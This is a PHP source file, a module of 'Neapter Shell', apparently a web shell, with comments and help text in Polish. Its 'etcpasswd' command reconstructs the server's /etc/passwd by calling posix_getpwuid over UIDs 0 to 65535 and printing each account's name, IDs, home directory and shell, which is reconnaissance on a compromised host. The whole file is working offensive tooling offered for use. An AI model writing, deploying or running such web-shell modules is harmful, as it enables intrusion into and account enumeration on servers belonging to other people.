<?php

/**
 * Neapter Shell
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012, Krzysztof Otręba
 *
 * @license   http://www.gnu.org/licenses/gpl-3.0.txt
 */

/**
 * Odwzorowanie zawartosci pliku /etc/passwd
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012, Krzysztof Otręba
 *
 * @package    NeapterShell
 * @subpackage Modules
 */
class ModuleEtcPasswd extends ModuleAbstract
{
    /**
     * Dostepna lista komend
     *
     * @access public
     * @return array
     */
    public function getCommands()
    {
        return array('etcpasswd');
    }

    /**
     * Zwracanie wersji modulu
     *
     * @access public
     * @return string
     */
    public function getVersion()
    {
        /**
         * Wersja Data Autor
         */
        return '1.00 2011-06-04 - <krzotr@gmail.com>';
    }

    /**
     * Zwracanie pomocy modulu
     *
     * @access public
     * @return string
     */
    public function getHelp()
    {
        return <<<DATA
Próba pobrania struktury pliku /etc/passwd za pomocą funkcji posix_getpwuid

	Użycie:
		etcpasswd

		etcpasswd [limit_dolny] [limit_górny]

	Przykład:

		etcpasswd
		etcpasswd 1000 2000
DATA;
    }

    /**
     * Wywolanie modulu
     *
     * @access public
     * @return string
     */
    public function get()
    {
        /**
         * Help
         */
        if ($this->oShell->iArgc === 1) {
            return $this->getHelp();
        }

        /**
         * Nie mozemy uruchomic tego na windowsie
         */
        if ($this->oShell->bWindows) {
            return 'Nie można uruchomić tego na windowsie';
        }

        /**
         * funkcja posix_getpwuid musi istniec
         */
        if ($this->oShell->bFuncOwnerById) {
            return 'Funkcja "posix_getpwuid" nie istnieje';
        }

        /**
         * Dolny zakres
         */
        if (isset($this->oShell->aArgv[0]) && (($this->oShell->aArgv[0] < 0) || ($this->oShell->aArgv[0] > 65534))) {
            return 'Błędny zakres dolny';
        }

        /**
         * Gorny zakres
         */
        if (isset($this->oShell->aArgv[1]) && (($this->oShell->aArgv[0] > $this->oShell->aArgv[1]) || ($this->oShell->aArgv[1] > 65534))) {
            return 'Błędny zakres górny';
        }

        $sOutput = NULL;

        $iMin = (isset($this->oShell->aArgv[0]) ? $this->oShell->aArgv[0] : 0);
        $iMax = (isset($this->oShell->aArgv[1]) ? $this->oShell->aArgv[1] : 65535);

        /**
         * Iteracja
         */
        for ($i = $iMin; $i <= $iMax; $i++) {
            if (($aUser = posix_getpwuid($i)) !== FALSE) {
                /**
                 * Wzor jak dla pliku /etc/passwd
                 */
                $sOutput .= sprintf("%s:%s:%d:%d:%s:%s:%s\r\n", $aUser['name'], $aUser['passwd'], $aUser['uid'], $aUser['gid'], $aUser['gecos'], $aUser['dir'], $aUser['shell']);
            }
        }

        return $sOutput;
    }

}